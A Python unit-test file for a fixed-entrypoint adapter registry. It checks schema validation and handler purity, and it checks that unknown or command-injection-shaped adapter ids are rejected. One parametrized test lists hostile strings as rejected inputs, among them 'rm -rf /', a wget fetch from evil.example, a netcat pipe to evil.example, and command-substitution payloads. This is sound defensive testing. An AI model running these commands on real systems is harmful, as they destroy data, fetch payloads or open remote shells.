"""Unit tests for the fixed-entrypoint adapter registry (srl.execution.entrypoints).

Pins:

1. The shipped registry is exactly {echo.v1, uppercase.v1} in production (no
   test gate).
2. An unknown adapter id (including command-injection-shaped strings) raises
   UnknownAdapterError(CONTRACT_INVALID) at lookup, before any process exists.
3. The handlers are pure: echo returns its input; uppercase upper-cases ``text``.
4. Schema validation rejects missing required fields, extra fields, and non-dict
   payloads.
5. There is no runtime registration surface callable from data.
"""

from __future__ import annotations

import pytest

from srl.execution.entrypoints import (
    UNKNOWN_ADAPTER_FAIL_REASON,
    AdapterDescriptor,
    UnknownAdapterError,
    get_adapter,
    list_adapters,
    run_handler,
    validate_input,
    validate_output,
)

# Ensure the test-gate is OFF for the production-registry tests, then toggle it
# back off in a finally where we turn it on. We read the env at import time of
# the entrypoints hook, so we manipulate os.environ directly here.
_GATE = "SRL_RUNNER_TEST_ADAPTERS"


@pytest.fixture(autouse=True)
def _no_test_gate(monkeypatch: pytest.MonkeyPatch) -> None:
    """Ensure the test-only adapter gate is OFF for these tests.

    The production registry is exactly the two shipped adapters; tests that need
    the test adapters set the gate explicitly via a different fixture.
    """
    monkeypatch.delenv(_GATE, raising=False)


# ---------------------------------------------------------------------------
# Production registry shape.
# ---------------------------------------------------------------------------


def test_production_registry_is_exactly_two_adapters() -> None:
    """Without the test gate, the registry is exactly echo.v1 and uppercase.v1."""
    assert list_adapters() == ["echo.v1", "uppercase.v1"]


def test_get_adapter_echo_descriptor() -> None:
    """echo.v1 is a deterministic adapter with the expected shape."""
    desc = get_adapter("echo.v1")
    assert isinstance(desc, AdapterDescriptor)
    assert desc.adapter_id == "echo.v1"
    assert desc.version == "v1"
    assert desc.deterministic is True
    assert desc.input_schema["optional"] == ["value"]


def test_get_adapter_uppercase_descriptor() -> None:
    """uppercase.v1 requires a ``text`` field."""
    desc = get_adapter("uppercase.v1")
    assert desc.adapter_id == "uppercase.v1"
    assert desc.input_schema["required"] == ["text"]


# ---------------------------------------------------------------------------
# Unknown / injection ids are rejected at lookup (before any spawn).
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "adapter_id",
    [
        "echo.v1; rm -rf /",
        "echo.v1 && wget evil.example/payload.sh",
        "../../etc/passwd",
        "echo.v1`whoami`",
        "echo.v1$(id)",
        "echo.v1| nc evil.example 4444",
        "echo.v1\n/bin/sh",
        "nope.v1",
        "",
    ],
)
def test_unknown_adapter_id_rejected_before_spawn(adapter_id: str) -> None:
    """Every unknown/injection id raises UnknownAdapterError(CONTRACT_INVALID)."""
    with pytest.raises(UnknownAdapterError) as exc_info:
        get_adapter(adapter_id)
    assert exc_info.value.fail_reason == UNKNOWN_ADAPTER_FAIL_REASON
    assert exc_info.value.fail_reason == "CONTRACT_INVALID"
    assert exc_info.value.adapter_id == adapter_id


def test_unknown_adapter_is_value_error_subclass() -> None:
    """UnknownAdapterError is a ValueError so ``except ValueError`` catches it."""
    with pytest.raises(ValueError):
        get_adapter("not.real")


# ---------------------------------------------------------------------------
# Handler purity.
# ---------------------------------------------------------------------------


def test_echo_handler_returns_input() -> None:
    """echo.v1 returns its validated input payload unchanged."""
    out = run_handler("echo.v1", {"value": "hello"})
    assert out == {"value": "hello"}


def test_echo_handler_empty_payload() -> None:
    """echo.v1 accepts an empty payload (value is optional)."""
    out = run_handler("echo.v1", {})
    assert out == {}


def test_uppercase_handler_uppercases_text() -> None:
    """uppercase.v1 upper-cases the ``text`` field."""
    out = run_handler("uppercase.v1", {"text": "hello world"})
    assert out == {"text": "HELLO WORLD"}


def test_uppercase_handler_does_not_mutate_input() -> None:
    """The handler does not mutate the caller's input dict."""
    payload = {"text": "abc"}
    run_handler("uppercase.v1", payload)
    assert payload == {"text": "abc"}


# ---------------------------------------------------------------------------
# Schema validation.
# ---------------------------------------------------------------------------


def test_uppercase_missing_text_rejected() -> None:
    """A missing required ``text`` is rejected."""
    with pytest.raises(UnknownAdapterError):
        run_handler("uppercase.v1", {})


def test_echo_extra_field_rejected() -> None:
    """An extra (non-allowlisted) field is rejected."""
    with pytest.raises(UnknownAdapterError):
        run_handler("echo.v1", {"value": "x", "surprise": "smuggled"})


def test_uppercase_extra_field_rejected() -> None:
    """uppercase.v1 rejects an extra field alongside ``text``."""
    with pytest.raises(UnknownAdapterError):
        run_handler("uppercase.v1", {"text": "a", "extra": "b"})


def test_validate_input_non_dict_rejected() -> None:
    """A non-dict payload is rejected."""
    with pytest.raises(UnknownAdapterError):
        validate_input("echo.v1", [1, 2, 3])  # type: ignore[arg-type]
    with pytest.raises(UnknownAdapterError):
        validate_input("echo.v1", "not a dict")  # type: ignore[arg-type]


def test_validate_output_non_dict_rejected() -> None:
    """A non-dict output is rejected."""
    with pytest.raises(UnknownAdapterError):
        validate_output("echo.v1", 42)  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# Test-gate seam (loads fixed test adapters only under the env var).
# ---------------------------------------------------------------------------


def test_test_gate_loads_test_adapters(monkeypatch: pytest.MonkeyPatch) -> None:
    """Under SRL_RUNNER_TEST_ADAPTERS=1, the fixed test adapters are available."""
    monkeypatch.setenv(_GATE, "1")
    ids = set(list_adapters())
    # The shipped two are always present.
    assert {"echo.v1", "uppercase.v1"} <= ids
    # The test adapters are loaded only under the gate.
    assert {"sleeper.v1", "bomb.v1", "forker.v1", "chatter.v1"} <= ids


def test_test_gate_unset_excludes_test_adapters(monkeypatch: pytest.MonkeyPatch) -> None:
    """Without the gate, the test adapters are NOT in the registry."""
    monkeypatch.delenv(_GATE, raising=False)
    ids = set(list_adapters())
    assert "sleeper.v1" not in ids
    assert "bomb.v1" not in ids
    assert "forker.v1" not in ids
    assert "chatter.v1" not in ids


def test_test_gate_unknown_value_does_not_load(monkeypatch: pytest.MonkeyPatch) -> None:
    """A value other than '1' does not enable the gate."""
    monkeypatch.setenv(_GATE, "true")
    ids = set(list_adapters())
    assert "sleeper.v1" not in ids


def test_no_runtime_registration_from_data() -> None:
    """There is no ``register`` function that accepts caller data.

    This is a structural assertion: the entrypoints module exposes no callable
    that takes an arbitrary id/handler pair and mutates the registry. The only
    way to add an adapter is to edit the source.
    """
    import srl.execution.entrypoints as ent  # noqa: PLC0415  (introspection target)

    public = [n for n in dir(ent) if not n.startswith("_")]
    assert "register" not in public
    assert "register_adapter" not in public
    assert "add_adapter" not in public
    # The module must not expose eval/exec/import tricks as public API.
    assert "eval_adapter" not in public
